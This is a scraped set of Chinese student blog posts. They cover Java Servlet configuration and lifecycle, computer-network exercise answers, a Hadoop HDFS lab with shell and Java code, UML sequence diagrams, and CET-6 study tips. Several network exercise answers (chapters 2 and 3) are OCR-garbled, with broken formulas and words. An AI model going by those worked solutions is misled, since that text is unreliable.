http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;5. id=&quot;WebApp_ID&quot; metadata-complete=&quot;false&quot; version=&quot;4.0&quot;&gt;6. &lt;!-- metadata-complete取值为true，表示关闭注解支持 --&gt;7. &lt;!-- metadata-complete取值为false，表示启用注解支持 --&gt;8. &lt;/web-app&gt; 由于 metadata-complete 属性的默认值是 false，即默认启用 Servlet 注解支持，所以默认情况下，使用该注解时，不必创建 web.xml 文件。 2. 使用 @WebServlet 注解@WebServlet 属于类级别的注解，标注在继承了 HttpServlet 的类之上。常用的写法是将 Servlet 的相对请求路径（即 value）直接写在注解内，如下所示。 1• @WebServlet(&quot;/MyServlet&quot;) 该写法省略了 urlPatterns 属性名，其完整的写法如下所示。 1• @WebServlet(urlPatterns = &quot;/MyServlet&quot;)。 如果 @WebServlet 中需要设置多个属性，则属性之间必须使用逗号隔开，如下所示。 1234567891011121314151617181920212223242526271. package net.biancheng.www;2. 3. import java.io.IOException;4. import javax.servlet.ServletException;5. import javax.servlet.annotation.WebInitParam;6. import javax.servlet.annotation.WebServlet;7. import javax.servlet.http.HttpServlet;8. import javax.servlet.http.HttpServletRequest;9. import javax.servlet.http.HttpServletResponse;10. 11. @WebServlet(asyncSupported = true, name = &quot;myServlet&quot;, description = &quot;name描述&quot;, loadOnStartup = 1, urlPatterns = &#123;12. &quot;/MyServlet&quot;, &quot;/*&quot; &#125;, initParams = &#123;13. @WebInitParam(name = &quot;编程帮&quot;, value = &quot;www.biancheng.net&quot;, description = &quot;init参数1&quot;),14. @WebInitParam(name = &quot;京东&quot;, value = &quot;www.jd.com&quot;, description = &quot;init参数2&quot;) &#125;)15. public class MyServlet extends HttpServlet &#123;16. private static final long serialVersionUID = 1L;17. 18. protected void doGet(HttpServletRequest request, HttpServletResponse response)19. throws ServletException, IOException &#123;20. &#125;21. 22. protected void doPost(HttpServletRequest request, HttpServletResponse response)23. throws ServletException, IOException &#123;24. &#125;25. 26. &#125; 注意事项： 通过实现 Serlvet 接口或继承 GenericServlet 创建的 Servlet 类无法使用 @WebServlet 注解。 使用 @WebServlet 注解配置的 Servlet 类，不要在 web.xml 文件中再次配置该 Servlet 相关属性。若同时使用 web.xml 与 @WebServlet 配置同一 Servlet 类，则 web.xml 中 的值与注解中 name 取值不能相同，否则容器会忽略注解中的配置。 @WebServlet 注解 和 web.xml 的优缺点使用 web.xml 或 @WebServlet 注解都可以配置 Servlet， 两者各有优缺点。 @WebServlet 注解配置 Servlet 优点：@WebServlet 直接在 Servlet 类中使用，代码量少，配置简单。每个类只关注自身业务逻辑，与其他 Servlet 类互不干扰，适合多人同时开发。 缺点：Servlet 较多时，每个 Servlet 的配置分布在各自的类中，不便于查找和修改。 web.xml 配置文件配置 Servlet 优点：集中管理 Servlet 的配置，便于查找和修改。 缺点：代码较繁琐，可读性不强，不易于理解。 Servlet生命周期（附带实例）生命周期是指事物从创建到毁灭的过程。人的生命周期就是从出生到死亡的过程，在这个过程中，必定会有一些与生命周期息息相关的事件，如：出生、吃饭、上学、死亡等。这些事件会在生命周期中的某个特定时刻发生。 Servlet 也有生命周期，Servlet 的生命周期就是 Servlet 从创建到销毁的过程。Servlet 的生命周期由 Servlet 容器管理，主要分为以下 3 个阶段。 初始化阶段 运行时阶段 销毁阶段 在 javax.servlet.Servlet 接口中定义了 3 个方法：init()、service()、destory()，它们分别在 Servlet 生命周期的不同阶段被 Servlet 容器调用。 初始化阶段Servlet 初始化是其生命周期的第一个阶段，也是其他阶段的基础。只有完成了初始化，Servlet 才能处理来自客户端的请求。 Servlet 初始化阶段分为 2 步： 加载和实例化 Servlet； 调用 init() 方法进行初始化。 1. 加载和实例化 Servlet Servlet 容器负责加载和实例化 Servlet。当容器启动或首次请求某个 Servlet 时，容器会读取 web.xml 或 @WebServlet 中的配置信息，对指定的 Servlet 进行加载。加载成功后，容器会通过反射对 Servlet 进行实例化。 因为 Servlet 容器是通过 Java 的反射 API 来创建 Servlet 实例的，需要调用 Servlet 的默认构造方法（default constructor，即不带参数的构造方法），所以在编写 Servlet 类时，不能只提供一个带参数的构造方法。 2. 调用 init() 方法进行初始化 加载和实例化完成后，Servlet 容器调用 init() 方法初始化 Servlet 实例。 初始化的目的：让 Servlet 实例在处理请求之前完成一些初始化工作，例如建立数据库连接，获取配置信息等。 在 Servlet 的整个生命周期内，init() 方法只能被调用一次。 初始化期间，Servlet 实例可以通过 ServletConfig 对象获取在 web.xml 或者 @WebServlet 中配置的初始化参数。 运行时阶段运行时阶段是 Servlet 生命周期中最重要的阶段。Servlet 容器接收到来自客户端请求时，容器会针对该请求分别创建一个 ServletRequst 对象和 ServletResponse 对象，将它们以参数的形式传入 service() 方法内，并调用该方法对请求进行处理。 这里需要注意的是，执行 service() 方法前，init() 方法必须已成功执行。 在 service() 方法中，Servlet 通过 ServletRequst 对象获取客户端的相关信息和请求信息。在请求处理完成后，通过 ServletResponse 对象将响应信息进行包装，返回给客户端。当 Servlet 容器将响应信息返回给客户端后，ServletRequst 对象与 ServletResponse 对象就会被销毁。 在 Servlet 的整个生命周期内，对于 Servlet 的每一次请求，Servlet 容器都会调用一次 service() 方法，并创建新的 ServletRequest 和 ServletResponse 对象。即 service() 方法在 Servlet 的整个生命周期中会被调用多次。 销毁阶段当 Servlet 容器关闭、重启或移除 Servlet 实例时，容器就会调用 destory() 方法，释放该实例使用的资源，例如：关闭数据库连接，关闭文件的输入流和输出流等，随后该实例被 Java 的垃圾收集器所回收。 对于每个 Servlet 实例来说，destory() 方法只能被调用一次。 Servlet 生命周期执行流程 Servlet 生命周期流程如下图所示。 在 Servlet 的整个生命周期中，创建 Servlet 实例、init() 方法和 destory() 方法都只执行一次。当初始化完成后，Servlet 容器会将该实例保存在内存中，通过调用它的 service() 方法，为接收到的请求服务。 示例 下面通过一个案例加深对 Servlet 生命周期的理解。 在 servletDemo 项目中，对 MyServlet.java 进行修改，代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152531. package net.biancheng.www;2. 3. import java.io.IOException;4. import java.io.PrintWriter;5. 6. import javax.servlet.ServletException;7. import javax.servlet.annotation.WebInitParam;8. import javax.servlet.annotation.WebServlet;9. import javax.servlet.http.HttpServlet;10. import javax.servlet.http.HttpServletRequest;11. import javax.servlet.http.HttpServletResponse;12. 13. @WebServlet(&quot;/MyServlet&quot;)14. public class MyServlet extends HttpServlet &#123;15. private static final long serialVersionUID = 1L;16. private int initCount = 0;17. private int httpCount = 0;18. private int destoryCount = 0;19. 20. @Override21. public void destroy() &#123;22. destoryCount++;23. super.destroy();24. // 向控制台输出destory方法被调用次数25. System.out.println(26. &quot;**********************************destroy方法：&quot; + destoryCount + &quot;*******************************&quot;);27. &#125;28. 29. @Override30. public void init() throws ServletException &#123;31. initCount++;32. super.init();33. // 向控制台输出init方法被调用次数34. System.out.println(&quot;init方法：&quot; + initCount);35. &#125;36. 37. public void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;38. httpCount++;39. // 控制台输出doGet方法次数40. System.out.println(&quot;doGet方法：&quot; + httpCount);41. // 设置返回页面格式与字符集42. resp.setContentType(&quot;text/html;charset=UTF-8&quot;);43. PrintWriter writer = resp.getWriter();44. // 向页面输出45. writer.write(&quot;初始化次数:&quot; + initCount + &quot;&lt;br/&gt;&quot; + &quot;处理请求次数:&quot; + httpCount + &quot;&lt;br/&gt;&quot; + &quot;销毁次数:&quot; + destoryCount);46. writer.close();47. &#125;48. 49. protected void doPost(HttpServletRequest request, HttpServletResponse response)50. throws ServletException, IOException &#123;51. &#125;52. 53. &#125; 启动 Tomcat，在地址栏输入“http://localhost:8080/servletDemo/MyServlet”，多次访问 MyServlet，结果如下图。 控制台输出，如下图。 关闭 Tomcat 服务器，控制台输出如下图。","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"web开发","slug":"web开发","permalink":"http://1905060202.github.io/tags/web%E5%BC%80%E5%8F%91/"},{"name":"Java Web","slug":"Java-Web","permalink":"http://1905060202.github.io/tags/Java-Web/"},{"name":"Servlet","slug":"Servlet","permalink":"http://1905060202.github.io/tags/Servlet/"}]},{"title":"计算机网络习题","date":"2021-11-10T14:22:26.000Z","path":"2021/11/10/计算机网络习题/","text":"第一章1-01 简述分组交换的要点： 加首部，报文分组 经路由器存储转发 在目的地合并 1-03 试从多个方面比较电路交换、报文交换和分组交换的主要优缺点： 电路交换，端对端通信质量因为约定了通信资源获得可靠保障，对连续传送大量数据效率高。 报文交换，无需预约传送带宽，动态逐段利用传输带宽对突发式数据通信效率高。 分组交换，具有报文交换的高效，迅速的特点，并且各分组较小路由灵活，生存性能好。 1-08 计算机网络都有哪些类别？各种类别的网络都有哪些特点？ 按范围： 广域网WAN：远程、高速、是Internet的核心网 城域网：城市范围，链接多个局域网 局域网：校园、企业、机关、社区 个域网PAN：个人电子设备 按用户： 公用网：面向公共运营 专用网：面向特定机构 1-10 线路交换时延：kd+x/b+s 分组交换时延：kd+(x/p)×(p/b)+(k-1)×(p/b)，其中(k-1)×(p/b)表示K段传输中，有（k-1）次的储存转发时延，当s&gt;(k-1)×(p/b)时，电路交换的时延比分组交换的时延大，当x&gt;&gt;p，则结果相反。 1-11 总时延D表达式，分组交换时延为：D=kd+(x/p)×（（p+h）/b）+（k-1）×（p+h）/b。 D对p求导后，令其值等于0，求得p=[(xh)/(k-1)]^(1/2)。 1-12 Internet的两大部分组成（边缘部分与核心部分）的特点是什么？他们的工作方式各有什么特点？ 边缘部分：由各主机构成，用户直接进行信息处理和信息共享；低俗连入核心网。 核心部分：由各路由器连网，负责为边缘部分提供高速远程分组交换。 1-14 计算机网络有哪些常用的性能指标？ 速率 带宽 吞吐量 时延 时延带宽积 往返时间RTT 利用率 1-17 发送时延：ts=107/105=100s 传播时延：tp=106/(2×108)=0.005s 发送时延ts=103/109=1μs 传播时延：tp=106/(2×108)=0.005s 结论：若数据长度大而发送速率低，则在总时延中，发送时延往往大于传播时延。但若数据长度短而发送速率高，则传播时延就可能是总时延中的主要成分。 1-18 1-19 100/(100+20+20+18)=63.3% 1000/(1000+20+20+18)=94.5% 1-20 网络体系结构为什么要采用分层次的结构？试举出一些与分层体系结构的思想相似的日常生活的例子 各层之间是独立的。某一层可以使用其下一层提供的服务而不需要知道服务是如何实现的。 灵活性好。当某一层发生变化时，只要其接口关系不变，则这层以上或以下的各层均不受影响。 结构上可以分隔开。各层可以采用最合适的技术来实现 易于实现和维护。 能促进标准化工作。 与分层体系结构思想相似的日常生活有邮政系统，物流系统。 1-22 网络协议的三个要素是什么？各有什么含义？网络协议：为进行网络中的数据交换而建立的规则、标准或约定。 语法。即数据与控制信息的结构或格式 语义。即需要发出何种控制信息，完成何种动作以及做出何种反应 同步：即事件实现顺序的详细说明 1-26 1实体（ en &quot; ty ）表示任何可发送或接收信息的硬件或软件进程．协议是控制两个对等实体进行通信的规则的集合。客户（ c Uent ）和服务器（ server ）都是指通信中所涉及的两个应用进程．客户是服务的请求方，服务器是服务的提供方。客户服务器方式所描述的是进程之间服务和被服务的关系。协议栈：指计算机网络体系结构采用分层模型后，每层的主要功能山对等层协议的运行来实现，因而每层可用一些上要协议来表征，儿个层次画在一起很像一个栈的结构．对等层：在网络体系结构中，通信双方实现同样功能的层．协议数据单元：对等层实体进行信息交换的数据单位．服务访问点：在同一系统中相邻两层的实体进行交互（即交换信息）的地方．服务访问点 SAP 是一个抽象的概念，它实体上就是一个逻辑接口． 1-29第二章2-04 数据：是运送信息的载体。 信号：是数据的电气的或电磁的表现 模拟数据：运送信息的模拟信号。 模拟信号：连续变化的信号。 数字信号：取值为有限的几个离散值的信号 数字数据：取值为不连续数值的数据 码元：在使用时间域的波形表示数字信号时，代表不同离散值的基本波形。 单工通信：即只有一个方向的通信而没有反方向的交互。 半双工通信：即通信双方都可以发送信息，但不能双方同时发送 全双工通信：即通信双方可以同时发送和接收信息。 2-06 码元传输速率受奈式准则的限制，信息传输速率受香农公式的限制。 香农公式在数据通信中的意义是：只要信息传输速率低于信道的极限传信率，就可以实现无差传输。 比特/s是信息传输速率的单位。码元传输速率也称为调制速率。一个码元不一定对应于一个比特。 2-07 C=R×Log2(16)=20000b/s×4=80000b/s 2-09 C = Wlog2(l+S/N) b/s-aSNl=2* (C1/W) -1=2* (35000/3100) -1 SN2=2* (C2AV) -1=2* (1.6Cl/w) -1=2 (1.6*35000/3100) -1 SN2/SN1=1OO 信噪比应增大到约 100 倍。C3=Wlong2 (1+SN3) =Wlog2 (l+10*SN2) C3/C2=18.5% 如果在此基础上将信噪比S/N再增大到10倍，最大信息通率只能再增加18.5%左右 2-13 为什么要使用信道复用技术？常用信道复用技术有哪些？为了通过共享信息、最大限度提高信道利用率。 频分 时分 码分 波分 2-16 S・A= (4-1-14-34-1-1+34-14-1) /8=1, A 发送 1 S・B= ( + 1-1-3-1-1-3-1-1-1) /8=-1, B 发送 0 S・C= ( + 1 + 14-3+1-1-3-1-1) /8=0, C 无发送 S・D= ( + 1 + 1+3 —1 + 1+3+1 — 1) /8=1, D 发送 1 第三章3-01 1数据链路与链路的区别在于数据链路出链路外，还必须有一些必要的规程来控制数据的传输，因此，数据链路比链路多了实现通信规程所需要的硬件和软件。“电路接通了”表示链路两端的结点交换机己经开机，物理连接己经能够传送比特流了，但是，数据传输并不可靠，在物理连接基础上，再建立数据链路连接，才是“数据链路接通了”，此后，由于数据链路连接具有检测、确认和重传功能，才使不太可靠的物理链路变成可靠的数据链路，进行可靠的数据传输当数据链路断开连接时，物理电路连接不一定跟着断开连接。 3-03 网络适配器的作用是什么？网络适配器工作在哪一层？1适配器（即网卡）来实现数据链路层和物理层这两层的协议的硬件和软件网络适配器工作在 TCPllP 协议中的网络接口层（ 051 中的数据链里层和物理层） 3-04 1帧定界是分组交换的必然要求透明传输避免消息符号与帧定界符号相混淆差错检测防止合差错的无效数据帧浪费后续路山上的传输和处理资源 3-06 1简单，提供不可靠的数据报服务，检错，无纠错不使用序号和确认机制地址字段 A 只置为 oxFF 。地址字段实际． L 并不起作用。控制字段 C 通常置为 0x03 。 PPP 是面向字节的当 PPP 用在同步传输链路时，协议规定采用硬件来完成比特填充（和 HDLC 的做法 · 样），当 PPP 用在异步传输时，就使用一种特殊的字符填充法 ppP 适用于线路质量不太差的情况下、 PPP 没有编码和确认机制 3-07 1作二进制除法， 1101011011 以众）两种错译均可发展仅仅采用了 CRC 检验 10011 得余数 1 110 ，添加的检验序列是 1110 ．作二进制除法，缺重传机制，数据链路层的传输还不是可靠的传输。 3-08 1作二进制除法，101110 000 10011 添加在数据后面的余数是011 3-20 假定1km长的CSMA/CD的网络数据率为1Gbit/s。设信号在网络上的传播速率为200000km/s。求能够使用此协议的最短帧长度。对于1km电缆，单程传播时间为1/200000=5为微秒，来回路程传播时间为 10微秒，为了能够按照CSMA/CD工作，最小帧的发射时间不能小于10微秒，以Gb/s速率工作，10微秒 可以发送的比特数等于10*10A0A-9=10000,因此，最短帧是10000位或1250字节长 3-24 设在t=0时A开始发送，在1= (64+8) *8=576比特时间，A应当发送完毕。仁225比特时间，B就检测出A的信号。只要B在t=224比特时间之前发送数据，A 在发送完毕之前就 3-25 在上题中的站点A和B在仁0时同时发送了数据帧。当t=255比特时间，A和B同时检测到发生了碰撞，并且在t=255+48=273比特时间完成了干扰信号的传输。A和B在CSMA/CD算法中选择不同的i■值退避。假定A和B选择的随机数分别是rA=O和rB=l。试问A和B各在什么时间开始重传其数据帧？ A重传的数据帧在什么时间到达B? A重传的数据会不会和B重传的数据再次发生碰撞？ B会不会在预定的重传时间停止发送数据？ t=0时,A和B开始发送数据Tl=225比特时间,A和B都检测到碰撞(tau)T2=273 比特时间,A和B结束干扰信号的传输(Tl+48) T3=594比特时间,A开始发送(T2+Tau+rATau+96 ) T4=785比特时间，B再次检测信道。(T4+T2+Tau+RbTau)如空闲，则B在T5=881比特时间发送数据、 否则再退避。(T5=T4+96) A重传的数据在819比特时间到达B, B先检测到信道忙，因此B在预定的881比特时间停止发送 3-27","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"习题","slug":"习题","permalink":"http://1905060202.github.io/tags/%E4%B9%A0%E9%A2%98/"},{"name":"计算机网络","slug":"计算机网络","permalink":"http://1905060202.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"}]},{"title":"大数据实验之拓荒","date":"2021-09-28T08:37:17.000Z","path":"2021/09/28/大数据实验之拓荒/","text":"拓荒者我们身为HNUST第一批数据科学与大数据技术专业的本科生，非常激动能够使用学院提供的服务器集群，并在这里留下属于我们的痕迹。 前置准备工作CDH环境说明 集群目前是以应用用途来划分hdfs用户，因此没有各位同学专属的目录。为此需要各位同学自行设置环境变量指明当前的hdfs用户，建议使用hdfs作为用户。具体做法为在远程终端登录之后(XSHELL 登录成功之后 ) 中执行如下命令。 1export HADOOP_USER_NAME=hdfs 或者可以将上述命令添加到自己使用的shell环境变量配置文件，以避免每次都需要重新执行上述命令，默认情况下用户配置文件是指是~/.bashrc。 可以通过 vim 文本处理命令添加。也可以通过下面的命令直接完成。 12echo &quot;export HADOOP_USER_NAME=hdfs&quot; &gt;&gt; ~/.bashrc source ~./bashrc 在我们指明了当前的用户之后，分布式文件系统的相对目录会对应在分布式文件系统的/user/hdfs 目录下。 准备工作为了避免各位同学的数据之间有混淆，建议建立一个自己的文件夹，这里以bigdata9为例。请注意自己运行时以自己的账号为文件夹名称，或其他可以与其它同学区别开的文件夹名称。 1hadoop fs -mkdir bigdata9 之后我们可以使用该目录作为我们使用的目录。 以实验一为例子。 实验一（SHELL版 )生成实验所需要的数据文件。 1mkdir input 1234for i in &#123;1..5&#125;; do echo $i$i$i &gt;&gt; input/$i.txt; done 1mv 3.txt 3.abc 通过这样我们把实验所需的数据生成在了input目录下。 我们可以看到input目录下的文件为 123451.txt 2.txt 3.abc 4.txt 5.txt 把input目录上传到我们先前准备的文件目录 1hadoop fs -put input bigdata9 运行如下命令可以查看我们的在 HDFS下的文件 1hadoop fs -ls bigdata9/input 对于实验一我们可以通过如下一行命令完成 1hadoop fs -ls bigdata9/input | awk &#x27;&#123;print $8&#125;&#x27;| sed -e &#x27;1d&#x27;|grep -v &quot;.abc$&quot;|xargs hadoop fs -cat 可以看到输出中没有以abc为后缀名的文件内容 (333)，如果需要将输出内容全部保存，则可以通过使用输出重定向完成。也就是在上述命令的末尾添加 &gt;&gt; merge.txt 完成输出的保存。需要注意的是这样文件会被保存在当前本地目录下。 实验一实验环境： （1）IDE：idea （2）Hadoop版本：3.1.0 （3）辅助工具：big data tools （本次实验为分布式环境下HDFS编程实例） 任务描述： 假设在HDFS下有几个文件，分别是file1.txt、file2.txt、file3.txt、file4.abc、file5.abc，这里需要从目录中过滤出所有后缀不为.abc的文件，对过滤之后的文件进行读取，并将这些文件的内容合并到文件merge.txt中。 实验步骤： 一、Shell版 二、JavaAPI版： 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package com.van;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileStatus;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IOUtils;import org.junit.After;import org.junit.Before;import org.junit.Test;import java.io.IOException;import java.io.InputStream;import java.net.URI;import java.net.URISyntaxException;import java.util.Arrays;/** * Author:WangChenXI * HuYaNING * YinGuanNAN * Date:2021/10/20 16:55 */public class Hadoop_practice01 &#123; private FileSystem fs; Path workDir; Path resultFile; Configuration conf ; @Before public void Init() throws URISyntaxException, IOException, InterruptedException &#123; URI uri = new URI(&quot;hdfs://125.221.232.243:8020&quot;); String user = &quot;hdfs&quot;; conf = new Configuration(); fs = FileSystem.get(uri, conf,user); &#125; @After public void close() throws IOException &#123; fs.close(); &#125; @Test public void testmkdir() throws URISyntaxException, IOException, InterruptedException &#123; fs.mkdirs(new Path(&quot;bigdata82/Practice01&quot;)); &#125; @Test public void testMerge() throws IOException &#123; workDir = new Path(&quot;bigdata82/Practice01&quot;); resultFile = new Path(workDir, &quot;merge.txt&quot;); Path[] paths = Arrays.stream(fs.listStatus(workDir, path -&gt; !path.toString().matches(&quot;[\\\\s\\\\S]*?\\\\.abc&quot;)) ).map(FileStatus::getPath).toArray(Path[]::new); fs.createNewFile(resultFile); fs.concat(resultFile, paths); InputStream resultFile= fs.open(this.resultFile); System.out.println(&quot;合并后的 merge.txt 内容&quot;); IOUtils.copyBytes(resultFile, System.out, conf); &#125;&#125; 实验效果： 实验七实验环境： （1）IDE：idea （2）Hadoop版本：3.1.0 （3）辅助工具：big data tools 实验生成测试数据代码： 12345678910111213141516import random&quot;&quot;&quot;Author: HuYaNINGDate: 2021.10.23 18:41&quot;&quot;&quot;txtName = &quot;Generate_data04.txt&quot;txtLine = 188pid = [&quot;01&quot;,&quot;02&quot;,&quot;03&quot;,&quot;04&quot;,&quot;05&quot;,&quot;06&quot;,&quot;07&quot;,&quot;08&quot;,&quot;09&quot;,&quot;10&quot;]i = 1;f = open(txtName,&#x27;w&#x27;,encoding=&quot;utf-8&quot;)while(i&lt;=txtLine): f.write(str(1000+i)+&quot; &quot;+pid[random.randint(0,9)]+&quot; &quot;+str(i)+&quot;\\n&quot;) i = i+1f.close() 实验指导： 创建了文件夹： 在从终端上传文件到远端时出错： 原因：windows下没有hadoop的环境变量，需要安装Hadoop解决。","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"hadoop","slug":"hadoop","permalink":"http://1905060202.github.io/tags/hadoop/"},{"name":"大数据技术","slug":"大数据技术","permalink":"http://1905060202.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"软件工程之时序图","date":"2021-09-22T13:25:55.000Z","path":"2021/09/22/软件工程之时序图/","text":"什么是时序图#时序图(Sequence Diagram)，又名序列图、循序图，是一种UML交互图。它通过描述对象之间发送消息的时间顺序显示多个对象之间的动态协作。 使用场景#时序图的使用场景非常广泛，几乎各行各业都可以使用。当然，作为一个软件工作者，我这边主要列举和软件开发有关的场景。 1. 梳理业务流程 一般的软件开发都是为了支撑某个具体的业务。有时候业务的流程会比较复杂，涉及到多种角色，这时就可以使用时序图来梳理这个业务逻辑。这样会使业务看起来非常清晰，代码写起来也是水到渠成的事情了。 2. 梳理开源软件 作为一个合格的程序员，阅读源代码的能力一定要过关。一般成熟框架的源代码调用深度都比较深，类之间的调用关系也比较复杂。我喜欢用时序图来梳理框架中这些对象之间的关系。比如再看Tomcat启动流程的过程中，我就时序图梳理了各个组件之间的关系，看起来层次非常清楚，也便于记忆。 时序图的角色#我们在画时序图时会涉及下面7种元素： 角色(Actor) 对象(Object) 生命线(LifeLine) 控制焦点(Activation) 消息(Message) 自关联消息 组合片段。 其中前6种是比较常用和重要的元素，最后的组合片段元素不是很常用，但是比较复杂。我们先介绍前6种元素，再单独介绍组合片段元素。 1. 角色(Actor) 系统角色，可以是人或者其他系统和子系统。以一个小人图标表示。 2. 对象(Object) 对象位于时序图的顶部,以一个矩形表示。对象的命名方式一般有三种： 对象名和类名。例如：华为手机:手机、loginServiceObject:LoginService； 只显示类名，不显示对象，即为一个匿名类。例如：:手机、:LoginSservice。 只显示对象名，不显示类名。例如：华为手机:、loginServiceObject:。 3. 生命线(LifeLine) 时序图中每个对象和底部中心都有一条垂直的虚线，这就是对象的生命线(对象的时间线)。以一条垂直的虚线表。 4. 控制焦点(Activation) 控制焦点代表时序图中在对象时间线上某段时期执行的操作。以一个很窄的矩形表示。 5. 消息(Message) 表示对象之间发送的信息。消息分为三种类型。 同步消息(Synchronous Message)消息的发送者把控制传递给消息的接收者，然后停止活动，等待消息的接收者放弃或者返回控制。用来表示同步的意义。以一条实线和实心箭头表示。 异步消息(Asynchronous Message) 消息发送者通过消息把信号传递给消息的接收者，然后继续自己的活动，不等待接受者返回消息或者控制。异步消息的接收者和发送者是并发工作的。以一条实线和大于号表示。 返回消息(Return Message)返回消息表示从过程调用返回。以小于号和虚线表示。 6. 自关联消息 表示方法的自身调用或者一个对象内的一个方法调用另外一个方法。以一个半闭合的长方形+下方实心剪头表示。 下面举例一个时序图的列子，看下上面几种元素具体的使用方式。 7. 组合片段 组合片段用来解决交互执行的条件和方式，它允许在序列图中直接表示逻辑组件，用于通过指定条件或子进程的应用区域，为任何生命线的任何部分定义特殊条件和子进程。组合片段共有13种，名称及含义如下： 组合名称 组合含义 ref 引用其他地方定义的组合片段 alt 在一组行为中根据特定的条件选择某个交互 opt 表示一个可选的行为 break 提供了和编程语言中的break类拟的机制 par 支持交互片段的并发执行 seq 强迫交互按照特定的顺序执行 strict 明确定义了一组交互片段的执行顺序 neg 用来标志不应该发生的交互 region 标志在组合片段中先于其他交互片断发生的交互 ignore 明确定义了交互片段不应该响应的消息 consider 明确标志了应该被处理的消息 assert 标志了在交互片段中作为事件唯一的合法继续者的操作数 loop 说明交互片段会被重复执行 组合片段的功能平时用的不是很多，具体使用时可以参考本文最后关于组合片段的文章，这边不做深入介绍了。 画图工具推荐#processon ProcessOn是一个在线作图工具的聚合平台，它可以在线画流程图、思维导图、UI原型图、UML、网络拓扑图、组织结构图等等，您无需担心下载和更新的问题，不管Mac还是Windows，一个浏览器就可以随时随地的发挥创意，规划工作； 您可以把作品分享给团队成员或好友，无论何时何地大家都可以对作品进行编辑、阅读和评论； ProcessOn不仅仅汇聚着强大的作图工具，这里还有着海量的图形化知识资源我们尽可能的将有价值的知识进行梳理，传递到您的眼前。 参考# https://blog.csdn.net/fly_zxy/article/details/80911942（重点参） http://baijiahao.baidu.com/s?id=1561926824533534&amp;wfr=spider&amp;for=pc 组合片段 作者：程序员自由之路 出处：https://www.cnblogs.com/54chensongxia/p/13236965.html 版权：本作品采用「署名-非商业性使用-相同方式共享 4.0 国际」许可协议进行许可。 自己画的几个时序图![登陆时序图](/images/python/1905060202 胡雅宁 软件工程作业(登录时序图).png) ![查询图书时序图](/images/python/1905060202 胡雅宁 软件工程作业(查询图书时序图) .png) ![添加图书时序图](/images/python/1905060202 胡雅宁 软件工程作业(添加图书时序图).png)","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"},{"name":"软件工程","slug":"软件工程","permalink":"http://1905060202.github.io/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"}]},{"title":"速过英语六级攻略","date":"2021-09-09T14:16:50.000Z","path":"2021/09/09/速过英语六级攻略/","text":"英语六级的判分机制第一，你要知道，成绩计算其实是有公式的，官方给出的公式是： 解释一下： X：代表的是你该项卷面分 Mean：代表的是样本均值 SD：代表的是样本标准差 TotSco：就是最后打在成绩单上的分数啦。 其中Mean和SD由本次考试被抽样的学生成绩所决定，所以啊，成绩高低还得看他们的发挥啊！ 四级考试的常模群体选自全国16所高校的约三万名非英语专业的考生；六级常模群体选自全国五所重点大学的约五千名非英语专业的考生。 四六级的分数不是由你答对的题目决定的，而是由你在抽样学生中的排名所决定的。 对我们来说，这就是一场排位赛！你的分数取决于你在这个排位中的位置。 想要排位高，拿分高，就要确保自己能拿的分一定拿下，让自己的X远超过Mean。 工欲善其事必先利其器知道了六级判分的规则，我们如何应对呢？如我们只是简单的、很傻逼把整张卷子从头做到尾，按照出卷人的顺序做题，那你就中圈套了！！ 下面我们看一张六级试卷题型与分数的分布图。 可以看出来，分值占比较大的题型是听力篇章 ，仔细阅读 ，写作 ，段落翻译 ，长篇阅读 。这些加在一起，分数占比达到了恐怖的**80%**。 请问你看出什么端倪来了吗？ 倘若你能把这80%都拿下，哪怕说拿下其中的40%，你就已经超过了绝大多数同学了。为什么？因为六级分数分布符合正态分布！ 术业有专攻啊，同学们！何必苦苦追求那可怜的短篇新闻、长对话和词汇理解的分数呢？对我来说，词汇理解就是六级题型中最恶心的部分，你词汇量不够大，语法体系不够完善，理解出现了误差，给你一天时间都做不完！自己只会陷入对不熟的词汇的无尽的纠结之中，十分痛苦。 得阅读者得天下阅读考察的是词汇量和语感，这需要大量的时间去练习。我们可以看到仔细阅读加上长阅读得分数占比就已经高达30%了！别看不起30%，但凡听力难一点，大家都不会，你要把这30%拿下，绝逼就可以通过六级考试。 得阅读者的天下！请记住这句话！ 如果你想通过六级考试，记得把这30%全拿下，最差也得拿下25%。这就意味着，你的仔细阅读+长阅读最多只能错三个。 如何保证阅读理解得高分呢？三个字，词汇量。你对英语的一切的恐惧都源自词汇量的不足。 怎么提高词汇量？日复一日的重复和坚持！请问你有一直在背单词吗？如果没有，对不起，你与六级无缘。 背单词是很苦逼的事情，但请坚持下去，哪怕每天只看20个单词，坚持它180天，六级核心词汇也就全拿下了。什么？你觉得180天很长吗？它只不过是你大学一个学期加假期的长度，只不过是一年之内两次六级考试之间的时间间隔。弹指一挥间。 